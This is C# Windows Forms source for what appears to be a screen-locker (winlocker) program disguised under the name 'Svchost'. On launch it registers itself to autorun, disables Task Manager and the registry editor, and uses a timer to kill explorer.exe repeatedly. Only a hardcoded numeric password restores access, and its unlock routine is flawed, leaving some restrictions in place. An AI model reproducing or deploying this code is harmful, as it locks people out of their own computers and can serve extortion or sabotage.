using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.IO;
using System.Management;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace WindowsFormsApp2
{
    public partial class Svchost : Form
    {

        public Svchost()
        {
            InitializeComponent();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            textBox1.Text += "1";
        }

        private void button5_Click(object sender, EventArgs e)
        {
            textBox1.Text += "2";
        }

        private void button6_Click(object sender, EventArgs e)
        {
            textBox1.Text += "3";
        }

        private void button7_Click(object sender, EventArgs e)
        {
            textBox1.Text += "4";
        }

        private void button8_Click(object sender, EventArgs e)
        {
            textBox1.Text += "5";
        }

        private void button9_Click(object sender, EventArgs e)
        {
            textBox1.Text += "6";
        }

        private void button10_Click(object sender, EventArgs e)
        {
            textBox1.Text += "7";
        }

        private void button11_Click(object sender, EventArgs e)
        {
            textBox1.Text += "8";
        }

        private void button12_Click(object sender, EventArgs e)
        {
            textBox1.Text += "9";
        }

        private void button13_Click(object sender, EventArgs e)
        {
            textBox1.Text += "0";
        }

        private void button3_Click(object sender, EventArgs e)
        {
            textBox1.Text = "";

        }
        public bool SetAutorunValue(bool autorun)
        {
            string name = "WindowsFormsApplication5";//Application name
            string ExePath = System.Windows.Forms.Application.ExecutablePath;//Current path
                                                                             //of application execution
            RegistryKey reg;//Class for working with Windows registry
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");//Subkey creating in registry
            try
            {
                if (autorun)
                {
                    reg.SetValue(name, ExePath);//If success - then set an autoran key values
                                                //according to this application
                }
                else
                {
                    reg.DeleteValue(name);//If failed - delete a created key
                }
                reg.Close();//Write data to registry and close it
            }
            catch
            {
                return false;//If exception (fail)
            }
            return true;//If success
        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "26381234")
            {

                Process.Start("explorer");
                SetAutorunValue(false);
                MessageBox.Show("If explorer dont run - run it manuality or reboot pc.");
                Application.Exit();

                RegistryKey Deletekey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                Deletekey.DeleteValue("DisableTaskMgr");
                Deletekey.Close();
            }
            else
            {
                textBox1.Text = "Неверный пароль";
            }
        }

        private void Svchost_Load(object sender, EventArgs e)
        {
            timer1.Enabled = true;
            label4.Text = Environment.UserName;
            label8.Text = Environment.MachineName;
            label9.Text = (" " + Environment.OSVersion);
            label10.Text = ("Секунд с момента запуска системы:      " + Environment.TickCount);
            SetAutorunValue(true);

            RegistryKey saveKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            saveKey.SetValue("DisableTaskMgr", "1");
            saveKey.Close();

            RegistryKey saveKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            saveKey2.SetValue("DisableRegistryTools", "1");
            saveKey2.Close();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Process[] procs = Process.GetProcessesByName("explorer"         );
            foreach (Process p in procs)
            {
                p.Kill();
            }
        }
    }
}
